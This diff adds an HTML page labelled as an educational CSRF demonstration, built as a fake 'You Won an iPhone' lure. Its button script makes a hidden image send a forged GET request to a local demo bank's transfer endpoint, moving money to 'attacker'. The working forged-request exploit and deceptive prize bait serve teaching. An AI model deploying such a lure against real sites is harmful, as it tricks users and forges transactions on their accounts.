@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Congratulations! You Won an iPhone!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f9;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .card {
+      background: #ffffff;
+      max-width: 500px;
+      width: 100%;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+    }
+    h1 {
+      color: #d9534f;
+      font-size: 26px;
+      margin-top: 0;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 16px;
+      line-height: 1.5;
+      margin: 10px 0;
+    }
+    .prize-btn {
+      background-color: #28a745;
+      color: #ffffff;
+      border: none;
+      padding: 14px 28px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: background-color 0.2s;
+    }
+    .prize-btn:hover {
+      background-color: #218838;
+    }
+    .prize-btn:disabled {
+      background-color: #6c757d;
+      cursor: not-allowed;
+    }
+    #status-msg {
+      margin-top: 22px;
+      padding: 14px;
+      border-radius: 6px;
+      font-weight: 500;
+      display: none;
+    }
+    .status-active {
+      display: block !important;
+      background-color: #e8f4fd;
+      border: 1px solid #b6e0fe;
+      color: #0c5460;
+    }
+    .note {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #666;
+      border-top: 1px solid #eee;
+      padding-top: 15px;
+      text-align: left;
+    }
+    .note strong {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Congratulations! You Won an iPhone!</h1>
+    <p>Click below to claim your free prize.</p>
+    
+    <button id="claimBtn" class="prize-btn" onclick="claimPrize()">Click Here to Win an iPhone</button>
+    
+    <div id="status-msg"></div>
+
+    <div class="note">
+      <p><strong>Educational CSRF Demonstration:</strong> This page represents an attacker-hosted lure site. When the button is clicked, it silently sends a forged GET request to the local banking application at <code>http://localhost:3000/transfer?to=attacker&amp;amount=500</code> using an off-screen image element.</p>
+    </div>
+  </div>
+
+  <script>
+    function claimPrize() {
+      // Create hidden image to forge the GET transfer request
+      const hiddenImg = new Image();
+      hiddenImg.src = "http://localhost:3000/transfer?to=attacker&amount=500";
+
+      // Disable button to prevent spamming
+      const btn = document.getElementById('claimBtn');
+      btn.disabled = true;
+      btn.innerText = "Prize Claimed!";
+
+      // Instruct user to return to dashboard and refresh
+      const statusDiv = document.getElementById('status-msg');
+      statusDiv.className = "status-active";
+      statusDiv.innerHTML = "<strong>Claim request dispatched!</strong><br><br>Now please return to your <strong>Banking Dashboard</strong> tab at <a href=\"http://localhost:3000\" target=\"_blank\">http://localhost:3000</a> and refresh the page to observe your updated balances.";
+    }
+  </script>
+</body>
+</html>
